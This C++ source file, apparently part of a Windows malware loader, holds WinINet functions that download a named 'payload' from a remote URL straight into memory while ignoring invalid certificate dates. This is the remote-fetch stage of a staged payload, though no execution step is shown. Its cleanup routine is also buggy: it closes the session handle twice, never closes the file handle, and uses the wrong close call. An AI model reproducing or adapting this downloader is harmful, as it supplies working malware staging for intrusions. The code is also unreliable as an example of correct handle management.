#include "WebRetrival.h"

namespace check
{
	static void FetchPayloadDynamic_Cleanup
	(
		HINTERNET hInetSession,
		HINTERNET hInetFile
	)
	{
		if (hInetFile != nullptr && hInetFile != INVALID_HANDLE_VALUE)
		{
			if (CloseHandle(hInetSession) == FALSE) return;
			
		} 

		if (hInetSession != nullptr && hInetFile != INVALID_HANDLE_VALUE)
		{
			if (CloseHandle(hInetSession) == FALSE) return;
		}
	}
} 

BOOL FetchPayloadHttpStatic(LPWSTR lpwURLString,DWORD dwPayloadSize, PBYTE *pPayloadAddress)
{
	DWORD	  dwBytesWritten = NULL;
	HINTERNET hInetSession   = nullptr,
			  hInetFile		 = nullptr;
	BOOL	  bState		 = FALSE; 

	if (lpwURLString == nullptr || wcslen(lpwURLString) == NULL || dwPayloadSize == NULL || pPayloadAddress == nullptr) return FALSE;

	if (*pPayloadAddress == nullptr)
	{
		*pPayloadAddress = static_cast<PBYTE>(malloc(dwPayloadSize));

		if (*pPayloadAddress == nullptr) return FALSE;
	}

	if ((hInetSession = InternetOpenW(nullptr, NULL, nullptr, nullptr, NULL)) == nullptr) return FALSE;

	if ((hInetFile = InternetOpenUrlW(hInetSession, lpwURLString, nullptr, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL)) == nullptr)
	{
		check::FetchPayloadDynamic_Cleanup(hInetSession, nullptr);

		return FALSE;
	}

	bState = InternetReadFile(hInetFile, *pPayloadAddress, dwPayloadSize, &dwBytesWritten);

	check::FetchPayloadDynamic_Cleanup(hInetSession, hInetFile);

	InternetSetOptionW(nullptr, INTERNET_OPTION_SETTINGS_CHANGED, nullptr, NULL);

	if (bState != FALSE && dwBytesWritten == dwPayloadSize) return TRUE;
	
	return FALSE;
}



BOOL FetchPayloadHttpDynamic(LPWSTR lpwURLString, PBYTE* pPayloadAddress, PDWORD pdwPayloadSize)
{
	HINTERNET hInetSession		  = nullptr,
			  hInetFile			  = nullptr;
	DWORD     dwTracker			  = NULL,
			  dwBytesRead		  = NULL,
			  dwPayloadSize		  = NULL,
			  dwSizeOfPayloadSize = sizeof(dwPayloadSize);


	if ((hInetSession = InternetOpenW(nullptr, NULL, nullptr, nullptr, NULL)) == nullptr)
	{
		return FALSE;
	}

	if ((hInetFile = InternetOpenUrlW(hInetSession, lpwURLString, nullptr, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL)) == nullptr)
	{
		check::FetchPayloadDynamic_Cleanup(hInetSession, nullptr);

		return FALSE;
	}

	if (!HttpQueryInfoW(hInetFile, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &dwPayloadSize, &dwSizeOfPayloadSize, nullptr) || dwPayloadSize == NULL)
	{
		check::FetchPayloadDynamic_Cleanup(hInetSession, hInetFile);

		return FALSE;
	}

	*pdwPayloadSize = dwPayloadSize;

	if ((*pPayloadAddress = static_cast<PBYTE>(LocalAlloc(LPTR, dwPayloadSize))) == nullptr)
	{
		check::FetchPayloadDynamic_Cleanup(hInetSession, hInetFile);

		return FALSE;
	}

	do 
	{
		if (InternetReadFile(hInetFile, *pPayloadAddress + dwTracker, dwPayloadSize - dwTracker, &dwBytesRead) == FALSE) continue;
		
		if (dwBytesRead == NULL)
		{
			check::FetchPayloadDynamic_Cleanup(hInetSession, hInetFile);

			return FALSE;
		}

		dwTracker += dwBytesRead;
	}
	while (dwPayloadSize > dwTracker);

	check::FetchPayloadDynamic_Cleanup(hInetSession, hInetFile);

	InternetSetOptionW(nullptr, INTERNET_OPTION_SETTINGS_CHANGED, nullptr, NULL);

	if (dwTracker != dwPayloadSize) return FALSE;

	return TRUE;

}